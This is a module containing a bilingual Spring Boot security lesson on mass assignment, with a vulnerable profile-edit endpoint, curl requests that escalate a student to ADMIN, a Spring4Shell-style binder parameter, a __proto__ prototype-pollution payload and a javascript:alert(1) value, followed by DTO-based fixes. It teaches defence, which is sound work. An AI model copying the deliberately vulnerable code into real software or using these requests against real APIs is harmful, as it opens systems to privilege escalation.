/**
 * spring-boot/s10-hacker.mjs — Chương 10: Góc nhìn hacker — bảo vệ API Spring (soạn 20/11/2026, agent sb).
 * Mọi output là chạy thật: Spring Boot 4.1.2 / Spring Security 7.1.2 / Hibernate 7.4 / Jackson 3 / Bucket4j 8.14.0 trên Temurin 21.0.12.1,
 * PostgreSQL 16.15 (container sb-c10-pg); Node 22 + pg để so sánh; gitleaks 8.30.1. Cổng 41940/41941 trên máy đo ghi thành 8080/8081.
 * Mã demo: scratchpad/sb/lab/c10/app (labflow.DemoApp, tuyến /v0 = bản SAI), t/*.sh, node/*; Lab 10: lab/c10/lab10/{starter,giai,cham.sh}.
 * Output: ~/.rtq-sb/c10/o (lọc cổng ⇒ o/web). Hằng MA.. / OUT.. sinh bằng tam/s10/build.sh + gen-ma.mjs.
 */
import { java, sql, bash, props, xml, js, out, tl, giai } from './_chung.mjs';

// ===== Bài 10.1 =====
const MA101_V0 = java("@RestController\nclass HoSoV0 {\n    private final AccountRepository repo; private final JsonMapper json;\n    HoSoV0(AccountRepository repo, JsonMapper json) { this.repo = repo; this.json = json; }\n\n    /** SAI 1: đổ nguyên body JSON vào entity, rồi trả nguyên entity về. */\n    @PatchMapping(\"/v0/me\")\n    @Transactional\n    Account sua(@RequestBody String body, Authentication a) {\n        Account acc = repo.findByUsername(a.getName()).orElseThrow();\n        json.readerForUpdating(acc).readValue(body);       // mọi trường có setter đều nhận giá trị từ người dùng\n        return acc;                                         // dirty checking ⇒ UPDATE khi giao dịch kết thúc\n    }\n\n    /** SAI 2: form HTML kiểu Spring MVC cổ điển — @ModelAttribute nạp entity rồi DataBinder gán mọi tham số khớp tên. */\n    @ModelAttribute(\"acc\")\n    Account nap(Authentication a) { return a == null ? null : repo.findByUsername(a.getName()).orElse(null); }\n\n    @PostMapping(\"/v0/me/form\")\n    Account form(@ModelAttribute(\"acc\") Account acc) { return repo.save(acc); }\n}");
const OUT101 = out("# 1. Sửa tên hiển thị qua bản v0 — xem nó trả về những gì\n$ curl -X PATCH /v0/me -H \"Authorization: Bearer $LAN\" -d '{\"displayName\":\"Lan Nguyen\"}'\n{\"avatarUrl\":null,\"displayName\":\"Lan Nguyen\",\"id\":2,\"passwordHash\":\"{bcrypt}$2a$10$7RuYqrOBpi8UOEoR8FOg7.cNQttK60MRltxTA4o24hVuGMQXoFfC.\",\"role\":\"STUDENT\",\"studentId\":1,\"username\":\"SE180123\"}\nHTTP 200\n\n# 2. Thêm MỘT trường vào body\n$ curl -X PATCH /v0/me -H \"Authorization: Bearer $LAN\" -d '{\"displayName\":\"Lan Nguyen\",\"role\":\"ADMIN\"}'\n{\"avatarUrl\":null,\"displayName\":\"Lan Nguyen\",\"id\":2,\"passwordHash\":\"{bcrypt}$2a$10$7RuYqrOBpi8UOEoR8FOg7.cNQttK60MRltxTA4o24hVuGMQXoFfC.\",\"role\":\"ADMIN\",\"studentId\":1,\"username\":\"SE180123\"}\nHTTP 200\n\n# 3. Token cũ vẫn ghi STUDENT ⇒ duyệt bị chặn; đăng nhập lại ⇒ token mới mang ADMIN\n$ curl -X PATCH /bookings/5/approve -H \"Authorization: Bearer $LAN\" -d '{\"version\":0}'\n\nHTTP 403\n$ (đăng nhập lại) payload token mới: {\"sub\":\"SE180123\",\"roles\":[\"ADMIN\"]}\n$ curl -X PATCH /bookings/5/approve -H \"Authorization: Bearer $LAN2\" -d '{\"version\":0}'\n{\"id\":5,\"labCode\":\"AI-03\",\"studentCode\":\"SE180207\",\"startAt\":\"2030-03-02T12:00:00\",\"endAt\":\"2030-03-02T13:00:00\",\"status\":\"APPROVED\",\"version\":1}\nHTTP 200\n\n# 4. Thử đổi luôn id\n$ curl -X PATCH /v0/me -H \"Authorization: Bearer $LAN\" -d '{\"id\":1}'\n{\"timestamp\":\"2026-11-20T03:03:14.959Z\",\"status\":500,\"error\":\"Internal Server Error\",\"path\":\"/v0/me\"}\nHTTP 500");
const OUT101B = out("# 5. Form HTML (application/x-www-form-urlencoded) — @ModelAttribute\n$ curl -X POST /v0/me/form -H \"Authorization: Bearer $AN\" -d 'displayName=An+Tran&role=ADMIN'\n{\"avatarUrl\":null,\"displayName\":\"An Tran\",\"id\":3,\"passwordHash\":\"{bcrypt}$2a$10$thuxdOhsKPFHe/Mvn7uUruRCBax3AlBETixnVZW5liHQ9gyQ99YTC\",\"role\":\"ADMIN\",\"studentId\":2,\"username\":\"SE180124\"}\nHTTP 200\n\n# 6. Tham số kiểu Spring4Shell (CVE-2022-22965)\n$ curl -X POST /v0/me/form -H \"Authorization: Bearer $AN\" -d 'displayName=An&class.module.classLoader.resources.context.parent.pipeline.first.pattern=hacked'\n{\"avatarUrl\":null,\"displayName\":\"An\",\"id\":3,\"passwordHash\":\"{bcrypt}$2a$10$thuxdOhsKPFHe/Mvn7uUruRCBax3AlBETixnVZW5liHQ9gyQ99YTC\",\"role\":\"ADMIN\",\"studentId\":2,\"username\":\"SE180124\"}\nHTTP 200");
const MA101_DUNG = java("@RestController\nclass HoSoController {\n    record CapNhatHoSo(@Size(max = 100) String displayName,\n                       @Size(max = 255) @Pattern(regexp = \"https://.+\") String avatarUrl) { }\n    record HoSoView(String username, String role, String displayName, String avatarUrl) {\n        static HoSoView of(Account a) { return new HoSoView(a.getUsername(), a.getRole(), a.getDisplayName(), a.getAvatarUrl()); }\n    }\n\n    private final AccountRepository repo;\n    HoSoController(AccountRepository repo) { this.repo = repo; }\n\n    @GetMapping(\"/me\")\n    HoSoView xem(Authentication a) { return HoSoView.of(repo.findByUsername(a.getName()).orElseThrow()); }\n\n    @PatchMapping(\"/me\")\n    @Transactional\n    HoSoView sua(@Valid @RequestBody CapNhatHoSo r, Authentication a) {\n        Account acc = repo.findByUsername(a.getName()).orElseThrow();\n        if (r.displayName() != null) acc.setDisplayName(r.displayName());   // allow-list viết tay: từng trường một\n        if (r.avatarUrl() != null) acc.setAvatarUrl(r.avatarUrl());\n        return HoSoView.of(acc);\n    }\n}");
const OUT101_DUNG = out("# 7. Bản đúng: PATCH /me nhận record CapNhatHoSo\n$ curl -X PATCH /me -H \"Authorization: Bearer $AN\" -d '{\"displayName\":\"An Tran\",\"role\":\"ADMIN\",\"passwordHash\":\"{noop}123\"}'\n{\"username\":\"SE180124\",\"role\":\"STUDENT\",\"displayName\":\"An Tran\",\"avatarUrl\":null}\nHTTP 200\n$ psql: STUDENT {bcrypt}$2a$1\n$ curl -X PATCH /me -H \"Authorization: Bearer $AN\" -d '{\"avatarUrl\":\"javascript:alert(1)\"}'\n{\"detail\":\"Invalid request content.\",\"instance\":\"/me\",\"status\":400,\"title\":\"Bad Request\"}\nHTTP 400");
const OUT101C = out("# 8. Cùng body, chạy với spring.jackson.deserialization.fail-on-unknown-properties=true\n$ curl -X PATCH /me -H \"Authorization: Bearer $AN\" -d '{\"displayName\":\"An Tran\",\"role\":\"ADMIN\"}'\n{\"detail\":\"Failed to read request\",\"instance\":\"/me\",\"status\":400,\"title\":\"Bad Request\"}\nHTTP 400");
const MA101_NODE = js("// 10.1 — cùng lỗi trong Express/Prisma: Object.assign(entity, req.body) và data: req.body\nconst user = { id: 2, username: 'SE180123', role: 'STUDENT', displayName: null };\nconst body = JSON.parse('{\"displayName\":\"Lan\",\"role\":\"ADMIN\",\"__proto__\":{\"isAdmin\":true}}');\nconst sai = Object.assign({ ...user }, body);\nconsole.log('Object.assign       :', JSON.stringify(sai), '| isAdmin =', sai.isAdmin);\nconst CHO_PHEP = ['displayName', 'avatarUrl'];\nconst dung = { ...user, ...Object.fromEntries(Object.entries(body).filter(([k]) => CHO_PHEP.includes(k))) };\nconsole.log('allow-list          :', JSON.stringify(dung));\nconst la = Object.keys(body).filter((k) => !CHO_PHEP.includes(k));\nconsole.log('kiểu zod .strict()  :', la.length ? `400 — trường không được phép: ${la.join(', ')}` : 'OK');");
const OUT101_NODE = out("Object.assign       : {\"id\":2,\"username\":\"SE180123\",\"role\":\"ADMIN\",\"displayName\":\"Lan\"} | isAdmin = true\nallow-list          : {\"id\":2,\"username\":\"SE180123\",\"role\":\"STUDENT\",\"displayName\":\"Lan\"}\nkiểu zod .strict()  : 400 — trường không được phép: role, __proto__");

const L101_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.1</span>
<h2>Mass assignment</h2>
<p class="lead">Chapter 9 gave LabFlow a front door: passwords, JWTs, roles. This chapter attacks the house from the inside, as a logged-in student who reads the API more carefully than its authors did. We start with the cheapest attack of all: send one extra JSON field and become ADMIN. No exploit kit, no password cracking — just a convenient line of code that copies "whatever the client sent" into an entity.</p>

<h3>In everyday life first</h3>
<p>You fill in a hotel registration card: name, phone, number of nights. At the bottom, in the same handwriting, you add "Room: presidential suite, price: 0". A careful receptionist types only the boxes printed on the card. A lazy one types every line on the paper into the system. <em>Mass assignment</em> is the lazy receptionist: the server takes every property in the request and assigns it to an object, including properties the form never showed — <code>role</code>, <code>id</code>, <code>passwordHash</code>, <code>balance</code>.</p>
<p>OWASP lists it as <strong>API3:2023 Broken Object Property Level Authorization</strong>, together with its twin, <em>excessive data exposure</em> (returning properties the client should never see). Both come from the same habit: using the entity itself as the request and response body.</p>

<h3>The vulnerable code: two "convenient" ways to edit a profile</h3>
<p>Lesson setup: V5 adds two columns a student may edit, <code>display_name</code> and <code>avatar_url</code>, to <code>accounts</code>. The <code>Account</code> entity has a getter and setter for every field — exactly what Lombok's <code>@Data</code> generates in a real project. The <code>/v0</code> routes are the vulnerable versions; the same app also has the fixed ones.</p>
${MA101_V0}
<ul>
  <li><code>readerForUpdating(acc)</code> is Jackson's "merge this JSON into an existing object". Every JSON property with a matching setter is applied.</li>
  <li>The method runs in a transaction, so Hibernate's dirty checking (lesson 6.2) writes every changed field to the database at commit. Nobody called <code>save</code>.</li>
  <li>The second route is the classic Spring MVC form: an <code>@ModelAttribute</code> method loads the entity, then <code>DataBinder</code> assigns every request parameter whose name matches a property.</li>
</ul>

<h3>Experiment 1: edit a display name, add one field, then another</h3>
<p>Lan (SE180123) is a STUDENT. Tokens are kept in variables (<code>$LAN</code>, <code>$AN</code>), never written on the command line:</p>
${OUT101}
<ul>
  <li><strong>Request 1 is the honest one</strong>, and it already leaks: the response is the entity, so it contains <code>passwordHash</code> (her BCrypt hash) and internal ids. That is excessive data exposure. Hashes are slow to crack (lesson 9.2), but a list of them is exactly what an offline attack needs.</li>
  <li><strong>Request 2</strong> adds <code>"role":"ADMIN"</code>. HTTP 200, and the database now says ADMIN. The CHECK constraint on <code>role</code> does not help: ADMIN is a valid value.</li>
  <li><strong>Step 3</strong> shows a detail people miss: the old token still says <code>roles: [STUDENT]</code>, so approving is refused (403). A JWT is a snapshot of the account at login time. Lan logs in again, the new token carries <code>ADMIN</code>, and she approves somebody else's booking (200). Privilege escalation in two requests.</li>
  <li><strong>Request 4</strong> tries to change <code>id</code>. Hibernate refuses with <code>Identifier of an instance of 'labflow.Account' was altered from 2 to 1</code> — a 500. The attack failed, but the 500 itself tells the attacker the endpoint writes straight into a JPA entity.</li>
</ul>

<h3>Experiment 2: the same bug in an HTML form, and Spring4Shell</h3>
${OUT101B}
<ul>
  <li>A form post <code>displayName=An+Tran&amp;role=ADMIN</code> makes An ADMIN. <code>@ModelAttribute</code> has the same problem as JSON: it binds by name, not by intention.</li>
  <li>Request 6 sends a parameter from the 2022 <strong>Spring4Shell</strong> exploit (CVE-2022-22965). Here it is silently ignored and the response is normal: since Spring Framework 5.3.18 / 5.2.20 the data binder refuses <code>class.*</code> paths. The display name was still applied, and An was still ADMIN from request 5 — the framework patch blocks one dangerous path, not your design.</li>
</ul>

<h3>The fix: a DTO in, a DTO out</h3>
<p>The request type lists exactly what a student may change. The response type lists exactly what a client may see. The entity stays inside the service.</p>
${MA101_DUNG}
${OUT101_DUNG}
<ul>
  <li>Same malicious body, plus a forged <code>passwordHash</code>: the record has no such components, so Jackson has nowhere to put them. Database still says STUDENT and <code>{bcrypt}</code>.</li>
  <li>The response is <code>HoSoView</code>: no hash, no ids.</li>
  <li>Bean Validation still applies: <code>avatarUrl</code> must start with <code>https://</code>, so <code>javascript:alert(1)</code> gets 400 (a stored XSS waiting for the frontend to render it).</li>
</ul>

<h3>Ignore unknown fields, or reject them?</h3>
<p>Spring Boot configures Jackson to <em>ignore</em> unknown properties, which is why the fixed endpoint quietly answered 200. One property flips that:</p>
${props('spring.jackson.deserialization.fail-on-unknown-properties=true')}
${OUT101C}
<p>Now the probe is refused with 400. Strict mode tells you (through logs and alerts) that someone is probing, and it catches frontend typos like <code>displayname</code>. The cost: an old mobile app that sends a field you removed starts failing. A common middle ground: strict on admin and security-sensitive endpoints, lenient elsewhere — but the DTO is mandatory in both cases. Strict mode without a DTO would still accept <code>role</code>, because <code>role</code> is a known property of the entity.</p>

<h3>Other tools you will meet</h3>
<ul>
  <li><code>@JsonIgnore</code> or <code>@JsonProperty(access = READ_ONLY)</code> on entity fields. It works until someone adds a new sensitive field and forgets the annotation — a deny-list. DTOs are an allow-list: a new field is invisible until you add it on purpose.</li>
  <li><code>@InitBinder</code> with <code>setAllowedFields("displayName", "avatarUrl")</code> for HTML forms. Same idea, older style.</li>
  <li>MapStruct or a constructor to copy DTO → entity. Fine, as long as the mapping is from a DTO that only contains allowed fields.</li>
</ul>

<h3>🕵️ Hacker corner — GitHub 2012 and Spring4Shell 2022</h3>
<p><strong>GitHub, 4 March 2012.</strong> Egor Homakov reported that Rails apps were vulnerable to mass assignment by default and was not taken seriously. To prove it, he used GitHub's own public-key form: he added a hidden <code>user_id</code> field pointing at an account with push access to the Rails repository, so his SSH key was attached to that account. He then pushed a commit to the <code>rails/rails</code> master branch. GitHub suspended him, fixed the bug within hours, and Rails 4 made "strong parameters" (an allow-list) the default. The attacker's steps: read the form, guess an internal attribute name, add it, submit.</p>
<p><strong>Spring4Shell, March 2022 (CVE-2022-22965).</strong> Spring's data binder walked property paths like <code>class.module.classLoader…</code> on JDK 9+. Through Tomcat's logging valve, attackers wrote a JSP web shell to disk and executed commands — remote code execution through a form-binding feature. It was exploited within days of disclosure. Defence: upgrade (5.3.18+), and never bind request data into objects that have more properties than the form.</p>
<p><strong>What you do:</strong> no <code>@Entity</code> in controller method signatures (in or out); one request record per use case; responses as view records; validation on the record; a code-review rule that flags <code>readerForUpdating</code>, <code>BeanUtils.copyProperties(request, entity)</code> and <code>@ModelAttribute</code> on entities.</p>

<h3>Compared with Node.js</h3>
<p>The JavaScript versions of the bug are <code>Object.assign(user, req.body)</code>, the spread <code>{...user, ...req.body}</code>, and Prisma's <code>update({ data: req.body })</code>. Measured in Node 22:</p>
${MA101_NODE}
${OUT101_NODE}
<p>Same escalation to ADMIN, plus a JavaScript-only twist: a JSON key <code>__proto__</code> passed through <code>Object.assign</code> changes the object's prototype, so <code>isAdmin</code> appears from nowhere (prototype pollution). Java has no such trick, but it has data binders. The fix is the same allow-list: in Express, a zod schema with <code>.strict()</code> or <code>.pick()</code>; in Spring, a record.</p>

<h3>In real life and at work</h3>
<ul>
  <li>SWP391 projects often have <code>@PutMapping("/users/{id}") User update(@RequestBody User u)</code> generated by a tutorial. Search your project for <code>@RequestBody</code> followed by an entity name.</li>
  <li>The same bug hides in admin tools: "import users from CSV" that maps every column, "PATCH any field" endpoints for the frontend team's convenience.</li>
  <li>Watch the response side too: returning the entity leaks every column added later (a <code>reset_token</code> next year, for example).</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"What is mass assignment and how do you prevent it in Spring?"</strong> — Binding client data onto an object with more properties than the client may set. Request DTOs (records) with only allowed fields, mapped explicitly; never an entity as <code>@RequestBody</code>.</li>
  <li><strong>"Why not just put @JsonIgnore on the role field?"</strong> — It is a deny-list on a shared class; every new sensitive field must remember it, and it also hides the field in responses where you may need it. DTOs are an allow-list per use case.</li>
  <li><strong>"The user changed their role but nothing happened until they logged in again. Why?"</strong> — The JWT holds the roles from login time; authorization reads the token, not the database. Also the reason role changes and revocation need short access tokens (lesson 9.5).</li>
  <li><strong>"What was Spring4Shell?"</strong> — CVE-2022-22965: data binding of <code>class.module.classLoader</code> paths on JDK 9+ led to RCE on Tomcat WAR deployments; fixed in Spring 5.3.18/5.2.20.</li>
  <li><strong>"OWASP API3?"</strong> — Broken Object Property Level Authorization: the user may access the object but not every property of it — covers both writing (mass assignment) and reading (excessive exposure).</li>
</ol>

<h3>🧪 Practice (20 minutes)</h3>
<div class="callout ok"><ol>
  <li>Before running anything, predict status code and the resulting <code>role</code> in the database for these three bodies against <code>PATCH /v0/me</code>: <code>{"displayName":"A"}</code>, <code>{"displayName":"A","role":"ADMIN"}</code>, <code>{"id":1}</code>.</li>
  <li>Predict the same three against the fixed <code>PATCH /me</code>, first with Spring Boot's defaults, then with <code>fail-on-unknown-properties=true</code>.</li>
  <li>List every field of the response of <code>PATCH /v0/me</code> that a student should not see, and why.</li>
</ol>
<p><strong>Done when:</strong> your nine predictions match the outputs in this lesson, and your list names at least <code>passwordHash</code>, <code>id</code> and <code>studentId</code> with a reason for each.</p></div>
${giai('Show the answers', `<p><code>/v0/me</code>: 200 / STUDENT; 200 / ADMIN; 500 (Hibernate "Identifier … was altered from 2 to 1") / unchanged. <code>/me</code> defaults: 200 / STUDENT for all three (unknown fields ignored; <code>{"id":1}</code> changes nothing). With strict mode: 200 for the first, 400 for the two that contain <code>role</code> or <code>id</code>. Fields: <code>passwordHash</code> (offline cracking material), <code>id</code> and <code>studentId</code> (internal keys that make IDOR guessing easier, lesson 10.2), and <code>role</code> is harmless to read but proves the entity is exposed.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Mass assignment</span><span class="v">Assigning every client-sent property onto an object, including ones the client must not set.</span></div>
  <div class="kv"><span class="k">BOPLA (API3:2023)</span><span class="v">Broken Object Property Level Authorization: access to an object, but not to every property of it.</span></div>
  <div class="kv"><span class="k">Excessive data exposure</span><span class="v">Returning more properties than the client needs (the entity instead of a view).</span></div>
  <div class="kv"><span class="k">DTO</span><span class="v">Data Transfer Object: a request or response type designed for one use case; in Java 21 usually a record.</span></div>
  <div class="kv"><span class="k">Allow-list / deny-list</span><span class="v">List what is permitted (safe by default) vs. list what is forbidden (unsafe by default).</span></div>
  <div class="kv"><span class="k">DataBinder</span><span class="v">Spring MVC component that assigns request parameters to object properties by name.</span></div>
  <div class="kv"><span class="k">Spring4Shell</span><span class="v">CVE-2022-22965, RCE through data binding of <code>class.*</code> paths.</span></div>
  <div class="kv"><span class="k">Prototype pollution</span><span class="v">JavaScript-only: a <code>__proto__</code> key changes an object's prototype.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li><code>readerForUpdating</code> into an entity + one extra field = ADMIN after the next login (measured).</li>
  <li>Returning the entity leaked the BCrypt hash on an ordinary request.</li>
  <li><code>@ModelAttribute</code> on an entity has the same bug; Spring blocks <code>class.*</code> since Spring4Shell, nothing else.</li>
  <li>Fix: request record (allow-list) + response record + validation; optional strict mode for 400 on unknown fields.</li>
  <li>Express has the same bug (<code>Object.assign</code>) plus prototype pollution; zod <code>.strict()</code> is the equivalent fix.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', '🛡️', 'OWASP API3:2023 Broken Object Property Level Authorization', 'Mass assignment and excessive data exposure, with examples.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html', '📋', 'OWASP Mass Assignment Cheat Sheet', 'Framework-by-framework defences, including Spring MVC.')}
${tl('https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement', '🍃', 'Spring Framework RCE, Early Announcement (2022)', 'The official Spring4Shell write-up and fixed versions.')}
${tl('https://github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation/', '🐙', 'GitHub — Public key security vulnerability and mitigation (2012)', 'GitHub’s own account of the Homakov incident.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: <code>labflow.DemoApp</code> (<code>HoSoV0</code>, <code>HoSoController</code>) in <code>lab/c10/app</code>, Spring Boot 4.1.2, Jackson 3.1.7, Hibernate 7.4.13.Final, PostgreSQL 16.15; Node 22 (20/11/2026).</li>
  <li>GitHub blog, 4/3/2012; Spring blog and CVE-2022-22965, 31/3/2022.</li>
</ul>
</div>
`;

const L101_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.1</span>
<h2>Mass assignment</h2>
<p class="lead">Chương 9 đã lắp cửa chính cho LabFlow: mật khẩu, JWT, vai trò. Chương này tấn công ngôi nhà từ BÊN TRONG, dưới vai một sinh viên đã đăng nhập và đọc API kỹ hơn chính người viết nó. Bắt đầu bằng đòn rẻ nhất: gửi thêm MỘT trường JSON và trở thành ADMIN. Không cần bộ công cụ tấn công, không cần bẻ mật khẩu — chỉ cần một dòng mã "tiện tay" chép mọi thứ client gửi vào entity.</p>

<h3>Đời thường trước đã</h3>
<p>Bạn điền phiếu đăng ký khách sạn: họ tên, điện thoại, số đêm. Cuối phiếu, cùng nét chữ, bạn viết thêm "Phòng: tổng thống, giá: 0". Lễ tân cẩn thận chỉ gõ các ô in sẵn trên phiếu. Lễ tân lười gõ MỌI dòng trên tờ giấy vào máy. <em>Mass assignment</em> chính là lễ tân lười: server lấy mọi thuộc tính trong request gán vào đối tượng, kể cả thuộc tính form không hề có — <code>role</code>, <code>id</code>, <code>passwordHash</code>, <code>balance</code>.</p>
<p>OWASP xếp nó vào <strong>API3:2023 Broken Object Property Level Authorization</strong> (phân quyền cấp THUỘC TÍNH), cùng với người anh em <em>lộ dữ liệu thừa</em> (trả về thuộc tính client không bao giờ được thấy). Cả hai cùng một thói quen: dùng chính entity làm thân request và thân response.</p>

<h3>Mã có lỗ: hai cách "tiện" để sửa hồ sơ</h3>
<p>Chuẩn bị: V5 thêm hai cột sinh viên được tự sửa, <code>display_name</code> và <code>avatar_url</code>, vào <code>accounts</code>. Entity <code>Account</code> có getter và setter cho MỌI trường — đúng thứ <code>@Data</code> của Lombok sinh ra trong dự án thật. Tuyến <code>/v0</code> là bản có lỗ; cùng ứng dụng có cả bản đã vá.</p>
${MA101_V0}
<ul>
  <li><code>readerForUpdating(acc)</code> là "trộn JSON này vào một đối tượng có sẵn" của Jackson. Mọi thuộc tính JSON có setter trùng tên đều được gán.</li>
  <li>Phương thức chạy trong giao dịch, nên dirty checking của Hibernate (bài 6.2) ghi mọi trường đã đổi xuống CSDL khi commit. Không ai gọi <code>save</code>.</li>
  <li>Tuyến thứ hai là form Spring MVC cổ điển: phương thức <code>@ModelAttribute</code> nạp entity, rồi <code>DataBinder</code> gán mọi tham số request có tên khớp một thuộc tính.</li>
</ul>

<h3>Thí nghiệm 1: sửa tên hiển thị, thêm một trường, rồi thêm trường nữa</h3>
<p>Lan (SE180123) là STUDENT. Token giữ trong biến (<code>$LAN</code>, <code>$AN</code>), không bao giờ ghi thẳng trên dòng lệnh:</p>
${OUT101}
<ul>
  <li><strong>Request 1 là request lương thiện</strong>, và nó đã lộ: phản hồi là entity, nên có <code>passwordHash</code> (chuỗi băm BCrypt của Lan) và các id nội bộ. Đó là lộ dữ liệu thừa. Băm thì chậm bẻ (bài 9.2), nhưng một danh sách băm là đúng thứ tấn công ngoại tuyến cần.</li>
  <li><strong>Request 2</strong> thêm <code>"role":"ADMIN"</code>. HTTP 200, và CSDL giờ ghi ADMIN. Ràng buộc CHECK trên <code>role</code> không giúp gì: ADMIN là giá trị hợp lệ.</li>
  <li><strong>Bước 3</strong> cho thấy một chi tiết hay bị bỏ qua: token cũ vẫn ghi <code>roles: [STUDENT]</code>, nên duyệt bị từ chối (403). JWT là ảnh chụp tài khoản lúc đăng nhập. Lan đăng nhập lại, token mới mang <code>ADMIN</code>, và Lan duyệt lượt đặt của người khác (200). Leo thang đặc quyền trong hai request.</li>
  <li><strong>Request 4</strong> thử đổi <code>id</code>. Hibernate từ chối: <code>Identifier of an instance of 'labflow.Account' was altered from 2 to 1</code> — lỗi 500. Đòn thất bại, nhưng chính lỗi 500 báo cho kẻ tấn công biết tuyến này ghi thẳng vào entity JPA.</li>
</ul>

<h3>Thí nghiệm 2: cùng lỗi trong form HTML, và Spring4Shell</h3>
${OUT101B}
<ul>
  <li>Form gửi <code>displayName=An+Tran&amp;role=ADMIN</code> biến An thành ADMIN. <code>@ModelAttribute</code> mắc đúng lỗi của JSON: nó gán theo TÊN, không theo Ý ĐỊNH.</li>
  <li>Request 6 gửi một tham số của khai thác <strong>Spring4Shell</strong> năm 2022 (CVE-2022-22965). Ở đây nó bị bỏ qua im lặng, phản hồi bình thường: từ Spring Framework 5.3.18 / 5.2.20, data binder từ chối đường <code>class.*</code>. Tên hiển thị vẫn được gán, và An vẫn là ADMIN từ request 5 — bản vá của framework chặn MỘT đường nguy hiểm, không chặn thiết kế của bạn.</li>
</ul>

<h3>Cách vá: DTO vào, DTO ra</h3>
<p>Kiểu request liệt kê ĐÚNG những gì sinh viên được đổi. Kiểu response liệt kê ĐÚNG những gì client được thấy. Entity ở yên trong service.</p>
${MA101_DUNG}
${OUT101_DUNG}
<ul>
  <li>Cùng thân độc, thêm cả <code>passwordHash</code> giả: record không có thành phần đó, Jackson không có chỗ để đặt. CSDL vẫn STUDENT và <code>{bcrypt}</code>.</li>
  <li>Phản hồi là <code>HoSoView</code>: không băm, không id.</li>
  <li>Bean Validation vẫn chạy: <code>avatarUrl</code> phải bắt đầu bằng <code>https://</code>, nên <code>javascript:alert(1)</code> nhận 400 (một lỗ XSS lưu trữ chờ frontend hiển thị).</li>
</ul>

<h3>Bỏ qua trường lạ, hay từ chối?</h3>
<p>Spring Boot cấu hình Jackson BỎ QUA thuộc tính lạ, nên tuyến đã vá trả 200 im lặng. Một thuộc tính đảo ngược điều đó:</p>
${props('spring.jackson.deserialization.fail-on-unknown-properties=true')}
${OUT101C}
<p>Giờ lần dò bị từ chối với 400. Chế độ chặt báo cho bạn (qua log, cảnh báo) rằng có người đang dò, và bắt được lỗi gõ của frontend như <code>displayname</code>. Cái giá: ứng dụng di động bản cũ còn gửi một trường bạn đã bỏ sẽ bắt đầu lỗi. Cách dung hoà hay gặp: chặt ở tuyến quản trị và tuyến nhạy cảm, nới ở chỗ khác — nhưng DTO là BẮT BUỘC trong cả hai trường hợp. Chế độ chặt mà không có DTO vẫn nhận <code>role</code>, vì <code>role</code> là thuộc tính hợp lệ của entity.</p>

<h3>Những công cụ khác bạn sẽ gặp</h3>
<ul>
  <li><code>@JsonIgnore</code> hoặc <code>@JsonProperty(access = READ_ONLY)</code> trên trường của entity. Chạy được cho tới ngày ai đó thêm một trường nhạy cảm mới và quên chú thích — đó là danh sách CẤM. DTO là danh sách CHO PHÉP: trường mới vô hình cho tới khi bạn cố ý thêm vào.</li>
  <li><code>@InitBinder</code> với <code>setAllowedFields("displayName", "avatarUrl")</code> cho form HTML. Cùng ý tưởng, kiểu cũ.</li>
  <li>MapStruct hoặc constructor để chép DTO → entity. Ổn, miễn là nguồn chép là DTO chỉ chứa trường được phép.</li>
</ul>

<h3>🕵️ Góc hacker — GitHub 2012 và Spring4Shell 2022</h3>
<p><strong>GitHub, 4/3/2012.</strong> Egor Homakov báo rằng ứng dụng Rails mặc định dính mass assignment và không được coi trọng. Để chứng minh, anh dùng chính form khoá công khai của GitHub: thêm một trường ẩn <code>user_id</code> trỏ vào một tài khoản có quyền đẩy mã lên kho Rails, nên khoá SSH của anh được gắn vào tài khoản đó. Rồi anh đẩy một commit lên nhánh master của <code>rails/rails</code>. GitHub tạm khoá anh, vá lỗi trong vài giờ, và Rails 4 đặt "strong parameters" (danh sách cho phép) làm mặc định. Các bước của kẻ tấn công: đọc form, đoán tên một thuộc tính nội bộ, thêm vào, gửi.</p>
<p><strong>Spring4Shell, 3/2022 (CVE-2022-22965).</strong> Data binder của Spring đi theo đường thuộc tính kiểu <code>class.module.classLoader…</code> trên JDK 9+. Qua valve ghi log của Tomcat, kẻ tấn công ghi một web shell JSP xuống đĩa rồi chạy lệnh — thực thi mã từ xa qua một tính năng gán form. Bị khai thác chỉ vài ngày sau khi công bố. Phòng: nâng cấp (5.3.18+), và không bao giờ gán dữ liệu request vào đối tượng có nhiều thuộc tính hơn form.</p>
<p><strong>Bạn làm gì:</strong> không có <code>@Entity</code> trong chữ ký phương thức controller (cả vào lẫn ra); mỗi ca sử dụng một record request; phản hồi là record view; validation đặt trên record; một luật review mã bắt <code>readerForUpdating</code>, <code>BeanUtils.copyProperties(request, entity)</code> và <code>@ModelAttribute</code> trên entity.</p>

<h3>So với Node.js</h3>
<p>Bản JavaScript của lỗi này là <code>Object.assign(user, req.body)</code>, phép trải <code>{...user, ...req.body}</code>, và <code>update({ data: req.body })</code> của Prisma. Đo trên Node 22:</p>
${MA101_NODE}
${OUT101_NODE}
<p>Cùng kiểu leo thang lên ADMIN, cộng một mánh chỉ JavaScript có: khoá JSON <code>__proto__</code> đi qua <code>Object.assign</code> đổi prototype của đối tượng, nên <code>isAdmin</code> từ đâu hiện ra (prototype pollution). Java không có mánh đó, nhưng có data binder. Cách vá giống nhau: danh sách cho phép — trong Express là schema zod với <code>.strict()</code> hoặc <code>.pick()</code>; trong Spring là record.</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li>Đồ án SWP391 hay có <code>@PutMapping("/users/{id}") User update(@RequestBody User u)</code> chép từ một bài hướng dẫn. Tìm trong dự án của bạn <code>@RequestBody</code> theo sau là tên một entity.</li>
  <li>Cùng lỗi trốn trong công cụ quản trị: "nhập người dùng từ CSV" ánh xạ mọi cột, tuyến "PATCH trường nào cũng được" cho tiện đội frontend.</li>
